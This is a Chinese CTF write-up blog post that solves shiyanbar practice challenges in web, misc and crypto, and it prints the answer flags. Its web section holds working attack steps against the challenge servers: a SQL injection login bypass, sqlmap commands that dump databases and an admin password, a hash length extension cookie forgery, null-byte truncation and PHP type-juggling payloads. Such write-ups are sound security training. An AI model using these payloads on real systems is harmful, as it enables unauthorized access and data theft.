---
title: 实验吧部分题目Writeup
date: 2017-10-10 18:08:02
tags:
	- CTF
	- Writeup
---
持续更新中。。
<!-- more -->
# Web
## 忘记密码了
地址：[http://ctf5.shiyanbar.com/10/upload/](http://ctf5.shiyanbar.com/10/upload/ "题目地址")


进入后，右键查看源代码

    <meta name="admin" content="admin@simplexue.com" />
    <meta name="editor" content="Vim" />

发现有两条不正常的信息，或许存在备份文件泄露。
然后尝试提交admin@simplexue.com
提示

	“邮件发到管理员邮箱了，你看不到的”
那我瞎填总行吧，随便填123
提示

	你邮箱收到的重置密码链接为 ./step2.php?email=youmail@mail.com&check=???????
接下来尝试".step1.swp"".step2.swp",都是404。

再用BurpSuite抓了下step2的包，在响应包中发现了

	<form action="submit.php" method="GET">
		<h1>找回密码step2</h1>
		email:<input name="emailAddress" type="text" value="admin@simplexue.com"  disable="true"/></br>
		token:<input name="token" type="text" /></br>
		<input type="submit" value="提交">
	</form>
尝试访问
> http://ctf5.shiyanbar.com/10/upload/.submit.php.swp

获得源代码

	if(!empty($token)&&!empty($emailAddress)){
		if(strlen($token)!=10) die('fail');
		if($token!='0') die('fail');
		$sql = "SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'";
		$r = mysql_query($sql) or die('db error');
		$r = mysql_fetch_assoc($r);
		$r = $r['num'];
		if($r>0){
			echo $flag;
		}else{
			echo "澶辫触浜嗗憖";
		}
	}
由此可知，只有token的值为0且长度为10，才可以通过验证。
于是乎构造payload：

	http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&token=0e12345678
获得flag:

	flag is SimCTF{huachuan_TdsWX}

## Once More
[题目地址]( http://ctf5.shiyanbar.com/web/more.php )

直接给了代码进行审计


    <?php
    if (isset ($_GET['password'])) {
    	if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
    	{
    		echo '<p>You password must be alphanumeric</p>';
    	}
    	else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
    	{
    		if (strpos ($_GET['password'], '*-*') !== FALSE)
    		{
    			die('Flag: ' . $flag);
    		}
    		else
    		{
    			echo('<p>*-* have not been found</p>');
    		}
    	}
    	else
    	{
    		echo '<p>Invalid password</p>';
    	}
    }
    ?>

要拿到flag需要满足三个条件

	1. 输入的password只能由字母和数字构成
	2. 输入的password的长度要小于8并且值要大于9999999
	3. 输入的password中还有*-*这一串字符
根据提示
	
	hint：ereg()函数有漏洞哩；从小老师就说要用科学的方法来算数。

ereg()函数可用%00截断，使用科学计数法可满足条件2

于是，构造

	 ?password=9e9%00*-*
提交获flag

	Flag: CTF{Ch3ck_anD_Ch3ck}

## 让我进去

[题目地址](http://ctf5.shiyanbar.com/web/kzhan.php )

使用burp抓一下包，在cookie这个键值对中，有个source=0,将其改为1，再次提交，即可获得源码。

	$flag = "XXXXXXXXXXXXXXXXXXXXXXX";
	$secret = "XXXXXXXXXXXXXXX"; // This secret is 15 characters long for security!

	$username = $_POST["username"];
	$password = $_POST["password"];

	if (!empty($_COOKIE["getmein"])) {
    	if (urldecode($username) === "admin" && urldecode($password) != "admin") {
        	if ($COOKIE["getmein"] === md5($secret . urldecode($username . $password))) {
        	    echo "Congratulations! You are a registered user.\n";
        	    die ("The flag is ". $flag);
        	}
        	else {
        	    die ("Your cookies don't match up! STOP HACKING THIS SITE.");
        	}
    	}
    	else {
    	    die ("You are not an admin! LEAVE.");
    	}
	}

	setcookie("sample-hash", md5($secret . urldecode("admin" . "admin")), time() + (60 * 60 * 24 * 7));

	if (empty($_COOKIE["source"])) {
    	setcookie("source", 0, time() + (60 * 60 * 24 * 7));
	}
	else {
    	if ($_COOKIE["source"] != 0) {
    	    echo ""; // This source code is outputted here
    	}
	}
利用hash长度扩展攻击

使用hashpump生成

    liwenhu@ubuntu:~$ hashpump
    Input Signature: 571580b26c65f306376d4f64e53cb5c7
    Input Data: admin
    Input Key Length: 20
    Input Data to Add: mengchen
    3bc397b2d7cb24c2be94db03cfd10b62
    admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00mengchen
    
因此令

	Cookies:getmein=3bc397b2d7cb24c2be94db03cfd10b62
	username=admin
	password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00mengchen
提交即可

	Congratulations! You are a registered user.
	The flag is CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther}

## 简单的sql注入之3
[题目地址](http://ctf5.shiyanbar.com/web/index_3.php)

神器SQlmap

注库名

	sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=123" --dbs --level 5

回显

	available databases [3]:
	[*] information_schema
	[*] test
	[*] web1
注表名

	sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=123" -D "web1" --tables --level 5
回显
	
	Database: web1
	[2 tables]
	+-------+
	| flag  |
	| web_1 |
	+-------+
注字段

	sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=123" -D "web1" -T "flag" --columns --level 5

回显
	Database: web1
	Table: flag
	[2 columns]
	+--------+----------+
	| Column | Type     |
	+--------+----------+
	| flag   | char(30) |
	| id     | int(4)   |
	+--------+----------+

注内容

	sqlmap -u "http://ctf5.shiyanbar.com/web/index_3.php?id=123" -D "web1" -T "flag" -C "flag" --dump --level 5
回显

	Database: web1
	Table: flag
	[1 entry]
	+----------------------------+
	| flag                       |
	+----------------------------+
	| flag{Y0u_@r3_5O_dAmn_90Od} |
	+----------------------------+
获得flag为

	flag{Y0u_@r3_5O_dAmn_90Od}

## 头有点大

[题目地址](http://ctf5.shiyanbar.com/sHeader/)

进入之后给了提示,需要满足三个条件

	1. 安装 .NET 9.9
	2. 使用IE浏览器访问
	3. 要在英国
根据提示和题目名称呢，可以判断要修改http头

于是乎构造
	
	User-Agent: Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/5.0) .NET CLR 9.9
	Accept-Language: en-gb;
通过burpsuite修改HTTP请求包即可获得flag
	
	The key is:HTTpH34der

## 程序逻辑问题
[题目地址]( http://ctf5.shiyanbar.com/web/5/index.php )

直接访问index.txt，可以获得源代码

<?php


	if($_POST[user] && $_POST[pass]) {
		$conn = mysql_connect("********, "*****", "********");
		mysql_select_db("phpformysql") or die("Could no	select database");
		if ($conn->connect_error) {
			die("Connection failed: " . mysql_error($conn));
	} 
	$user = $_POST[user];
	$pass = md5($_POST[pass]);

	$sql = "select pw from php where user='$user'";
	$query = mysql_query($sql);
	if (!$query) {
		printf("Error: %s\n", mysql_error($conn));
		exit();
	}
	$row = mysql_fetch_array($query, MYSQL_ASSOC);
	//echo $row["pw"];
  
  	if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
		echo "<p>Logged in! Key:************** </p>";
	}
	else{
    	echo("<p>Log in failure!</p>");
		}
  
	}

	?>

审计一下代码，最关键的是

	strcasecmp($pass, $row[pw])
构造payload

	user='and 1=0 union select md5(233) #&pass=233
提交即可获得Flag

	Logged in! Key: SimCTF{youhaocongming} 

## 看起来有点难

[题目地址](http://ctf5.shiyanbar.com/basic/inject )

上神器SQLmap

注库名

	sqlmap -u "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&pass=123&action=login" --dbs --level 5
回显
	
	available databases [2]:
	[*] information_schema
	[*] test
注表名

	sqlmap -u "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&pass=123&action=login" -D "test" --tables --level 5

回显

	Database: test
	[1 table]
	+-------+
	| admin |
	+-------+
注字段名

	 sqlmap -u "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&pass=123&action=login" -D "test" -T "admin" --columns --level 5

回显

	Database: test                
	Table: admin                  
	[2 columns]                   
	+----------+--------------+   
	| Column   | Type         |   
	+----------+--------------+   
	| password | varchar(100) |   
	| username | varchar(100) |   
	+----------+--------------+   
                              
直接注密码内容

	 sqlmap -u "http://ctf5.shiyanbar.com/basic/inject/index.php?admin=123&pass=123&action=login" -D "test" -T "admin" -C "password" --dump --level 5

回显

	Database: test
	Table: admin
	[1 entry]
	+----------+
	| password |
	+----------+
	| idnuenna |
	+----------+

直接登录即可获得flag，

	账号 admin 密码 idnuenna

获得key
	
	恭喜你密码正确！ KEY :!@#WwwN5f0cu5coM

## PHP大法

[题目地址]( http://ctf5.shiyanbar.com/DUTCTF/index.php)

进去后有提示

	Can you authenticate to this website? index.php.txt 
直接访问

	http://ctf5.shiyanbar.com/DUTCTF/index.php.txt

发现源码

	<?php
	if(eregi("hackerDJ",$_GET[id])) {
  	echo("<p>not allowed!</p>");
  	exit();
	}

	$_GET[id] = urldecode($_GET[id]);
	if($_GET[id] == "hackerDJ")
	{
  	echo "<p>Access granted!</p>";
  	echo "<p>flag: *****************} </p>";
	}
	?>

根据代码，要将hackerDJ进行两次url编码才可满足两个条件


	hackerDJ
 	
	%68%61%63%6B%65%72%44%4A

	%2568%2561%2563%256B%2565%2572%2544%254A

提交即可获得flag

	http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568%2561%2563%256B%2565%2572%2544%254A
回显

	Access granted!

	flag: DUTCTF{PHP_is_the_best_program_language}

## FALSE

题目直接给了源代码


	
	<?php
	if (isset($_GET['name']) and isset($_GET['password'])) {
    	if ($_GET['name'] == $_GET['password'])
    	    echo '<p>Your password can not be your name!</p>';
    	else if (sha1($_GET['name']) === sha1($_GET['password']))
      	die('Flag: '.$flag);
    	else
        	echo '<p>Invalid password.</p>';
	}
	else{
		echo '<p>Login first!</p>';
	?>

此处考察了一个知识点，MD5，sha1等hash函数在对数组进行加密的时候会返回FALSE，FALSE===FALSE是成立的。于是乎

	http://ctf5.shiyanbar.com/web/false.php?name[]=123&password[]=2

获得flag

	
	Flag: CTF{t3st_th3_Sha1}


## 上传绕过
[题目地址]( http://ctf5.shiyanbar.com/web/upload  )

00截断绕过，直接看图

	
![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-1.png)

flag为

	flag{SimCTF_huachuan}

## NSCTF web200

[题目地址]( http://ctf5.shiyanbar.com/web/web200.jpg )

简单的加密，写个小脚本跑一下即可

    #!python3
    #-*-coding:utf-8-*-
    import base64
    
    text = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"
    s = ""
    #rot13
    for i in text:
    	if(ord(i) <= 122 and ord(i) >= 97):
    		x = ord(i) + 13
    		if(x > 122):
    			x = x - 26
    	elif(ord(i) <= 90 and ord(i) >= 65):
    		x = ord(i) + 13
    		if(x > 90):
    			x = x - 26
    	else:
    		s+=i
    		continue
    	s += chr(x)
    print(s)
    s = s[::-1]
    print(s)
    s = base64.b64decode(s)
    print(s)
    re = ""
    s = str(s)
    for i in s:
    	x = chr(ord(i) - 1)
    	re += x
    re = re[::-1]
    print(re)

最后flag为

	&flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}&a


## 貌似有点难

根据代码提示，加一个XFF头即可

如图

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Web-%E8%B2%8C%E4%BC%BC%E6%9C%89%E7%82%B9%E9%9A%BE-1.png)

flag为

	SimCTF{daima_shengji}

## 天网管理系统

直接右键看源代码，有提示

	<!-- $test=$_GET['username']; $test=md5($test); if($test=='0') -->

找一个MD5值为0e开头的即可，网上随便找一个

	s155964671a

提示

	/user.php?fame=hjkleffifer
提交访问后，又给了一串代码

    <?php
    $unserialize_str = $_POST['password'];
    $data_unserialize = unserialize($unserialize_str);
    if ($data_unserialize['user'] == '???' && $data_unserialize['pass'] == '???') {
    	print_r($flag);
    }
    伟大的科学家php方言道：成也布尔，败也布尔。回去吧骚年 .
    ?>
还有提示，其实这里考察了PHP中布尔类型中的true可以与任意字符串弱类型相等，构造序列化字符串为

	a:2:{s:4:"user";b:1;s:4:"pass";b:1;}
在密码那一栏提交即可获得flag

	ctf{dwduwkhduw5465}

# 安全杂项

## deeeeeeaaaaaadbeeeeeeeeeef-200

把图片下载下来，尝试了各种姿势无果。然后用tweakpng检查一下文件，提示

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-deeeeee-1.png)

按照图示将其修改，把图片的高改长一点，发现flag、

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-deeeeee-2.png)

flag为

	key{TheISISPasswordIs}

## 这就是一个坑

给了一个压缩包和一个文档，压缩包中也有一个加密的文档，很明显就是明文攻击，直接上工具

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-%E8%BF%99%E5%B0%B1%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9D%91-1.png)

最后有坑，爆出来的密码最后几位是空格

flag为

	flag{Mtf1y@    }

## 紧急报文

题目描述

	解密一下这份截获的密文吧，时间就是机会！

	FA XX DD AG FF XG FD XG DD DG GA XF FA

	flag格式:flag_Xd{hSh_ctf:******}

百度可知一种报文密码--ADFGX密码

密码表为

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E7%B4%A7%E6%80%A5%E6%8A%A5%E6%96%87-1.png)

一一对应即可获得flag，为

	flag_Xd{hSh_ctf:flagxidianctf}


## 图片里的动漫
[题目地址]( http://ctf5.shiyanbar.com/misc/acg.jpg )

题目描述

	 一恒河沙中有三千世界，一张图里也可以有很多东西。

	答案是与一部动漫名字有关的小写英文字母。

	flag格式：CTF{xxx}
这题挺奇葩的。。给的图片直接改扩展名为rar,可以解压出一个flag.rar,打开后里面有个带密码的flag.txt文件。不是伪加密，也爆破不开。。

不过扔到kali里面使用binwalk分析一下发现有jpeg的文件头

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%9B%BE%E7%89%87%E9%87%8C%E7%9A%84%E5%8A%A8%E6%BC%AB-1.png)

尝试将扩展名改为jpeg，获得一张动漫的图，百度识图一下，是七龙珠。
再结合下面评论的提示

	flag就是 CTF{动漫名字的逆置}

《龙珠》英文名字（DRAGON BALL）

因此flag为

	CTF{llabnogard}

## Canon

[题目地址](  http://ctf5.shiyanbar.com/misc/mimimi.zip)

给了一个压缩包和一个MP3文件，压缩包是有密码的，看起来密码在mp3中，使用Audacity分析音频无果，尝试mp3stego,密码尝试一下Canon.

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-Canon-1.png)

解密获得密码，将压缩文件中的文档解压出来，看起来像是base64，直接扔到工具里解一下，然后直接搜一下CTF，找的flag

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9-Canon-2.png)

flag为

	CTF{WONVPAO AIUWNVPAOINE}

## ROT13变身了

[ 题目地址 ]( http://ctf5.shiyanbar.com/misc/rot-13.txt )

提示
	
	1、回旋13，回不回？ 2、有81,450,625种可能性
密文给了很多数字，看起来是ASCII,看题目应该不是普通的ROT·13，尝试将ASCII码减去13再转字符串，写脚本

	#Python3
	#-*-coding:utf-8-*-

	encodetxt = "83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112"

	st = encodetxt.split(' ')
	for i in range(len(st)):
		st[i] = int(st[i]) - 13
		print(chr(st[i]),end='')
输出如下

	FLAG IS flag{www_shiyanbar_com_is_very_good_????}
	MD5:38e4c352809e150186920aac37190cbc
再写脚本爆破

		import hashlib

	def MD5(data):
		m2 = hashlib.md5()
		m2.update(data)
		return m2.hexdigest()

	s = "flag{www_shiyanbar_com_is_very_good_"
	x = "38e4c352809e150186920aac37190cbc"
	for i in range(32,127):
		for j in range(32,127):
			for h in range(32,127):
				for k in range(32,127):
					st = s + chr(i) + chr(j) + chr(h) + chr(k) + "}"
					st = str(st)
					re = MD5(st)
					if(re == x):
						print(st)

flag为

	flag{www_shiyanbar_com_is_very_good_@8Mu}

## 解码磁带
[ 题目地址 ](  http://ctf5.shiyanbar.com/misc/cidai.html)

这个题考查字符转化为二进制，再翻译成对应的字符串，写脚本如下

	# -*- coding:utf-8 -*- 

	def bin2dec(string_num):
    	return str(int(string_num, 2))

	f = open('233.txt','r')
	file = open('re.txt','w')

	a = f.read()
	a = a.replace('o', '1')
	a = a.replace('_', '0')

	st = a.split('\n')
	for i in st:
	    file.write(chr(int(bin2dec(i))))
	    file.write('\n')
	f.close()
	file.close()

flag为

	simCTF{Where there is a will,there is a way.}

## 功夫秘籍
[ 题目地址 ](  http://ctf5.shiyanbar.com/423/misc/kungfu.rar )

使用winhex打开，在文件尾处发现线索

	key is VF95c0s5XzVyaGtfX3VGTXR9M0Vse251QEUg 
很明显是base64,解密得
	
	T_ysK9_5rhk__uFMt}3El{nu@E 

看起来像是栅栏，直接解密

	Th3_kEy_ls_{Kun9Fu_M@5tEr}

# Crypto

## 传统知识+古典密码
题目描述:

	小明某一天收到一封密信，信中写了几个不同的年份	
    辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳。
    信的背面还写有“+甲子”，请解出这段密文。

	key值：CTF{XXX}

解题过程

	辛卯，癸巳，丙戌，辛未，庚辰，癸酉，己卯，癸巳
	28 30 23 8 17 10 16 30
	甲子是 60

每个数字分别加上60，为

	88 90 83 68 77 70 76 90
转ASCII

	XZSDMFLZ

转栅栏

	4
	XZSD
	MFLZ
	XMZFSLDZ

	2
	XZ
	SD
	MF
	LZ
	XSMLZDFZ

将上述两条分别用恺撒密码暴力破解下，可以获得明文
	
	message = '此处填写要破解的密文'

	LETTERS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
	letters = 'abcdefghijklmnopqrstuvwxyz'

	for key in range(len(LETTERS)):
    	tran = ''
    	for i in message:
        	if i in LETTERS:
        	    num = LETTERS.find(i)
        	    num = num - key
        	    if num < 0:
        	        num = num + len(LETTERS)
        	    tran = tran + LETTERS[num]
        	elif i in letters:
        	    num = letters.find(i)
        	    num = num - key
        	    if num < 0:
        	        num = num + len(letters)
        	    tran = tran + letters[num]
        	else:
        	    tran = tran + i
    	print('key = %s: %s' % (key, tran.lower()))
flag为
	
	CTF{SHUANGYU}

## 这里没有key

[ 题目地址 ](  http://ctf5.shiyanbar.com:8080/4/index.html  )

访问地址，右键查看源代码。发现一串密文

	
	<!-- #@~^TgAAAA=='[6*liLa6++p'aXvfiLaa6i[[avWi[[a*p[[6*!I'[6cp'aXvXILa6fp[:6+Wp[:XvWi[[6+XivRIAAA==^#~@ -->

解密地址

	http://www.dheart.net/decode/index.php

解得flag为
	
	Encode@decode 
ps:最后有个空格

## 压缩的问题

[ 题目地址 ](   http://ctf5.shiyanbar.com/crypto/winrar/)

给了一大串16进制字符

	526172211A0700CF907300000D0000000000000056947424965E
	00600000004900000002E3B1696DEE413D3B1D33310020000000
	C3EBC6C6B2E2CAD44279CCECD2D76C6F76652E74787400796AD2
	34784B6DD58B0A427929591366006C6F7665002E7478742E2E5B
	7A2D7B7D2E2E39423843569449C8691BEC768E16663C5F9ED737
	AE6CDDC6178C0837F6BB88DAA8356B02A700C776FC0F1091C1D1
	6712FC075A011D5B5DEF7E46966E8B878B80DABCDF9683C49165
	FFB993A77CDE8600A1262200F3D3D5315DF0FC4E2B3ACAA3943F
	142EC43D7B00400700
将其粘贴到Winhex中保存为新文件，保存后将扩展名改为rar,即可打开，但是有密码。根据提示

	password crack, 65h -- 71h

猜测密码为winhex中65-71的16进制对应的字符的值。

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-%E5%8E%8B%E7%BC%A9%E7%9A%84%E9%97%AE%E9%A2%98-1.png)

将其粘贴出来，即可解压出文件，去网上找个在线计算sha1的网站

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-%E5%8E%8B%E7%BC%A9%E7%9A%84%E9%97%AE%E9%A2%98-2.png)

sha1为

	SHA1: 58a09ae43e5a9df9ad5e89f90c1bb7430dc5bd02 

所以flag为

	58a09ae4

## 我喜欢培根

给了长长的一大串摩尔斯电码

	
	-- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -.. -.-. -.-. -.. -.-. -.-. -.-. -.. -.. -.. -.-. -.. -.-. -.-. -.-. -.. -.. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.. -.. -.-. -.. -.-. -.-. -.-. -.-. -.. -.-. -.-. -.-. -.-. -.-. / -.-. -.. -.-. -.-. -.-. -.. -.-. -.-. -.. -.-. / -.-. -.-. -.-. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.-. -.. -..

	MORSEISCOOLBUTBACONISCOOLERDCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCC
	CDCCCDCCDC
	CCCDCCDDDCCDDDCCDCDD

密文

	DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCCCDCCCDCCDCCCCDCCDDDCCDDDCCDCDD

手撕(ง •_•)ง c是a,d是b

	DCCDC s
	CCDDD h
	CDCCC i
	DDCCC y
	CCCCC a
	CDDCD n
	CCCCD b
	CCCCC a
	CDCCC i
	DCCDC s
	CCCDC c
	CDDDC o
	CDDDC o
	CDCDD l
百度百科第一种方式可以成功解码,不过坑爹的答案是

	CTF{SHIYANBA IS COOL}
。。。

## 围在栅栏中的爱

题目描述

	 最近一直在好奇一个问题，QWE到底等不等于ABC？

	-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- --- 

	flag格式：CTF{xxx} 

密文首先解码莫尔斯密码

	KIQLWTFCQGNSOO

提示qwe等于abc,即

	qwertyuiopasdfghjklzxcvbnm
	abcdefjhijklmnopqrstuvwxyz
解密得

	RHASBENVAOYLII

再解栅栏

	rabnayihsevoli
再逆序

	iloveshiyanbar
最后提交

	CTF{iloveshiyanbar}

## 奇怪的字符串

题目描述

	 信息保密的需求和实际操作自古有之，与之相应的信息加密与解密也是历史悠久，现有一段经过古典密码理论（不止一种）加密的密文，内容如下：

	89 51 82 109 89 50 86 122 97 71 107 61请找出这段密文隐藏的消息明文 
密文
	89 51 82 109 89 50 86 122 97 71 107 61
ASCII转字符

	Y3RmY2VzaGk=
解base64

	ctfceshi

直接提交即可

## Decode

题目给了一大串16进制字符

	0x253464253534253435253335253433253661253435253737253464253531253666253738253464253434253637253462253466253534253662253462253464253534253435253738253433253661253435253737253466253531253666253738253464253434253435253462253464253534253435253332253433253661253435253738253464253531253666253738253464253534253535253462253464253534253431253330253433253661253435253737253465253531253666253738253464253661253435253462253466253534253633253462253464253534253435253737253433253661253662253334253433253661253662253333253433253661253435253738253465253431253364253364
转字符

	%4d%54%45%35%43%6a%45%77%4d%51%6f%78%4d%44%67%4b%4f%54%6b%4b%4d%54%45%78%43%6a%45%77%4f%51%6f%78%4d%44%45%4b%4d%54%45%32%43%6a%45%78%4d%51%6f%78%4d%54%55%4b%4d%54%41%30%43%6a%45%77%4e%51%6f%78%4d%6a%45%4b%4f%54%63%4b%4d%54%45%77%43%6a%6b%34%43%6a%6b%33%43%6a%45%78%4e%41%3d%3d
很明显是url编码，转一下

	MTE5CjEwMQoxMDgKOTkKMTExCjEwOQoxMDEKMTE2CjExMQoxMTUKMTA0CjEwNQoxMjEKOTcKMTEwCjk4Cjk3CjExNA==
base64解码

	119 101 108 99 111 109 101 116 111 115 104 105 121 97 110 98 97 114
ASCII转一下字符	
	
	welcometoshiyanbar

答案为
	ctf{welcometoshiyanbar}

## keyboard

提示

	与键盘有关
密文

	BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN

根据上述字母在键盘上的位置按顺序连成线，画出字符

	NBNCBNNBNBC
直接提交即可

## NSCTF crypto50

给了一串密文

	U2FsdGVkX1+qtU8KEGmMJwGgKcPUK3XBTdM+KhNRLHSCQL2nSXaW8++yBUkSylRp 

AES在线解密

	http://tool.oschina.net/encrypt

解密获得

	flag{DISJV_Hej_UdShofjyed}

凯撒移位一下

	flag{NSCTF_Rot_EnCryption}

## 疑惑的汉字

	 现有一段经过加密的密文，内容如下：王夫 井工 夫口 由中人 井中 夫夫 由中大。请找出这段密文隐藏的消息明文。

	格式：CTF{ }
很明显是当铺密码，直接解密

	67 84 70 123 82 77 125 
ASCII转字符

	CTF{RM}

## 古典密码

	密文内容如下{79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65}

	请对其进行解密
	提示：1.加解密方法就在谜面中

         2.利用key值的固定结构

	格式：CTF{ } 

密文
	79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65

ASCII转字符

	OCU{CFTELXOUYDECTNGAHOHRNFIENM}IOTA

古典密码最基本的加密方法就是置换

	OCU{CFT
	ELXOUYD
	ECTNGAH
	OHRNFIE
	NM}IOTA

列置换拼凑出CTF{}(存在4种可能)
	
	CTF{OCU
	LDYOEUX
	CHANEGT
	HEINOFR
	MATINO}
	CTF{OCULDYOEUXCHANEGTHEINOFRMATINO}

	CTF{COU
	LDYOUEX
	CHANGET
	HEINFOR
	MATION}
	CTF{COULDYOUEXCHANGETHEINFORMATION}

	CTF{COU
	UDYOLEX
	GHANCET
	FEINHOR
	OATIMN}
	CTF{COUUDYOLEXGHANCETFEINHOROATIMN}
	
	CTF{OCU
	UDYOELX
	GHANECT
	FEINOHR
	OATINM}
	CTF{OCUUDYOELXGHANECTFEINOHROATINM}
	

经过尝试，flag为

	CTF{COULDYOUEXCHANGETHEINFORMATION}

## The Flash-14

	这些数字都是什么呢~   54433252224455342251522244342223113412

	答案形式ctf{XXX} 

闪电侠第二季第14集有个加密方式

密码表

![](https://image.mengsec.com/%E5%AE%9E%E9%AA%8C%E5%90%A7-Crypto-Theflash-14.jpg)

	54 43 32 52 22 44 55 34 22 51 52 22 44 34 22 23 11 34 12
	YSMWGTZOGVWGTOGHAOB
凯撒解密

	key = 14: KEYISFLASHISFASTMAN

最后答案为

	ctf{flashisfastman}

## 凯撒是罗马共和国杰出的军事统帅

密文

	MGAKUZKRWZWGAWCP

直接暴力破解

	key = 2: KEYISXIPUXUEYUAN
最后的flag为

	XIPUXUEYUAN
## 摩擦摩擦

密文

	".-- . .-.. -.-. --- -- . - --- -..- .. .--. ..- -..- ..- . -.-- ..- .- -."

直接在线解码摩尔斯电码

	WELCOMETOXIPUXUEYUAN

## 最近听说刘翔离婚了

密文

	kyssmlxeei{ipeu}

刘翔 -> 跨栏 -> 栅栏

分为两栏解栅栏

	keyis{simplexue} 
## 奇妙的音乐

解压给的压缩包，给了一个图片和一个有密码的压缩包，压缩包里面有个wav文件，给的图片上画着一本书的2封面，上面写着海伦凯勒，而且下面有某种编码

图1

联想海伦凯勒的身份，应该是盲文，百度百科翻译一下

	kmdonowg

这个就是压缩文件的密码，直接解压，打开音乐是滴滴答答的声音，很明显是摩尔斯电码，借助Audacity将其提取出来。

-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..

解码得

	CTFWPEI08732?23DZ
实验吧的答案就是坑，还得小写

	CTF{wpei08732?23dz}


## 敌军情报

	 知彼知己方能百战不殆。天枢战队成员截获了一条命令密文45 46 45 46 32 45 32 46 46 45 46 32 46 45 32，你能解密成明文，做到知己知彼吗？

	格式：CTF{ } 
密文

	45 46 45 46 32 45 32 46 46 45 46 32 46 45 32
看起来像ASCII码，直接转换

	-.-. - ..-. .- 
摩尔斯电码，解码

	CTFA

坑爹的答案

	CTF{a}

## Fair-Play

题目描述

	The quick brown fox jumps over the lazy dog!
       ihxo{smzdodcikmodcismzd}

百度一下Fair-Play，找到了playfair密码，猜测密钥为

	The quick brown fox jumps over the lazy dog!

编制密码表,由于密文中没有j，因此要把密码表中的j去掉
	
	thequickbrownfoxumpsoverthelazydog
密码表为

	t h e q u
	i c k b r
	o w n f x
	m p s v l
	a z y d g
手撕....

	ih xo sm zd od     ci km     od     ci sm zd
	ct fx pl ay af(fa) ir si(is) af(fa) ir pl ay

整理下，明文应该是
	
	ctfx{playfairisfairplay}
奇葩的答案。。还带个x...
	


